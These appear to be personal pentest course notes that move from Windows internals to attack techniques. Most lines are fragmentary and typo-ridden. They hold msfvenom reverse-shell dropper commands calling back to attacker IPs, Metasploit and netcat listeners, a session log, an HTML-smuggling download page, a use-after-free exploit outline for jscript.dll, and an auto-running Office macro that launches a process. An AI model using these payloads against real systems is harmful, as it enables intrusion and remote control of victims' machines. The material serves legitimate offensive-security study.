password: @Hide01

# chapter 3 Windows concepts

1. WOW  - Windows on windows. Most windows mahine sise the 64 bit version of the Windows Operating system. However many applications are still 32 bit.

Ntdll.dll, Wow64.dll, Wow64Win.dll and Wow64Cpu.dll - used for this emuation.

2. WIn32 API -  various applications in a variety of programming languages ranging from assembly to C# but many of those make use of the windows provided built in programming interfaces.

Many  of  the  Win32  APIs  are  documented  by  Microsoft.  One  simple  example  is  the 
GetUserNameA33 API exported by Advapi32.dll which retrieves the name of the user executing the 
function. 

```
BOOL GetUserNameA( 
  LPSTR   lpBuffer, 
  LPDWORD pcbBuffer 
);
```

In this example, the API requires two arguments. The first is an output buffer of type LPSTR which 
is the Microsoft term for a character array. The second argument is a pointer to a DWORD which 
is a 32-bit unsigned integer. The return value from the API is a boolean.

Listing 2 above shows the prototype for GetUserNameA, where the suffix “A” indicates the ASCII 
version of the API. Listing 3 below shows the prototype for GetUserNameW, in which the “W” 
suffix (for “wide char”) indicates Unicode: 

```
BOOL GetUserNameW( 
  LPWSTR  lpBuffer, 
  LPDWORD pcbBuffer 
); 
```
3.  Windows Registry : Windows Registry to support local and global variables. 

4. page 31/704

Staged vs Non staged payloads

windows/shell/reverse_tcp is a simple non staged reverse TCP shell payload
Staged payloads contain a minimal amoutn of code thta tperforms a callback then retrieves any remaining acode and executes it in th etargets memory.

the differenece in the delimiters
s
windows/x64/meterpreter_reverse_https - meterpreter shell - full payload
windows/x64/meterpreter/reverse_https - Reflective dll staged - staged payload

5. Building a dropper

sudo msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.120 LPORT=4444 -f ee -o /var/ww/html/shell.exe

sudo service apache2 start

sudo nc -lnvp 4444 to start a reverse shell

6. Creating a staged dropper

So that the size is less.

sudo msfvenom -p windows/x64/meterpreter_reverse_https LHOST=10.10.6.10 LPORT=4444 -f exe -o /var/www/html/msfnonstaged.exe

```
kali@kali:~/cyber/pen300$ sudo nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.6.10] from (UNKNOWN) [10.10.136.133] 53944
��ao��H▒[�5x���h�5��H�����h�*Q&�,�+�0�/�$�#�(�'�
�       ����=<5/
F
▒
#�whoami
```

- creating a listener
```
sudo msfconsole -q

msf5 > use multi/handler

set payload windows/x64/meterpreter/reverse_https

set lhost 10.10.6.10

set lport 4444

exploit
```

for nonstaged payload you can get reverse connect on nc -lnvp 4444
for staged payloads we can get reverse shell on msfconsole

### Important commands for DIDR

listing processes
>tasklist | findstr pid
>taskkill /f /pid 123

netstat 
>netstat -aon | findstr "4444"
  -TCP    10.10.136.133:59795    10.10.6.10:4444        SYN_SENT        9972

Removing the entire directory
>RMDIR /s twint 

### HTML Smuggling

- attackers may use discreet delivery methods, embedding a link in an emal. using a javascript dropper code in the HTML itseld. we can create a simple hyperlink and set th edownload attribute anchor tag
```html
<html>
  <body>
    <a href="/msfstaged.exe" download="msfstaged.exe> DownloadME </a>
  </body>
</html>
```
However this makes the user manually click on the link. Instead we can make the lnk embedded javascript file.

we will create a Base64 meterpreter.


### HTML smuggling directly

Although this works well, it exposes the filename and extension of the dropper and requires the 
user to manually click on the link. To avoid this we can trigger the download from an embedded 
JavaScript file. This method feeds the file as an octet stream and will download the assembled 
file without user interaction.

# Day 5 cdac training

## use and free exploit

Patch diffing - Instruction to call the newly created object with `ScavVarList:Init`
VAR structure -  gv block has 100 VAR structure, each var will have its 24 byte structure, type of variable, obj ptr and next var ptr
VVAL structure - consist of structured va

Can I do the stuff that I needed to do in due time, 

Heap spray of fake vars
leak vftable address of an object poinin to jscript.dll
arbitary read primitive - kernel32.dll, ntfll.fll
function names - winexec, ntcontinue
Handling ASLR
Trigger - Trigger using typeof operator
create a fake object

Converting use after free to a type confusion bug
obj_ptr behaviour changes based on functionality

find out ho ot run iexplore and windbg


## Phishing in MS Office page 39

creating macros is defined here

```vb
Sub Document_Open()
    MyMacro

End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
'
' mymacro Macro
'
'
'    Dim myString As String
'    Dim myLong As Long
'    Dim myPointer As LongPtr

'    myLong = 1

'    If myLong < 5 Then
'        MsgBox ("Hi")
'    Else
'        MsgBox ("False")
    
'    End If

'    For counter = 1 To 3
'        MsgBox ("Hoo")
'    Next counter

    Dim str As String
    str = "Hi " + Environ$("computername") + "!"
    
    MsgBox (str)
    
    MsgBox ("You are " + CreateObject("WScript.Network").ComputerName + ", right?")
    'CreateObject("Wscript.Shell").Run str, 0
    
    MsgBox ("Lemme open a calculator for you!")
    str = "calc.exe"
    CreateObject("Wscript.Shell").Run str, 0
    
    'Shell str, vbHide
    
    MsgBox ("Bye")
End Sub
```


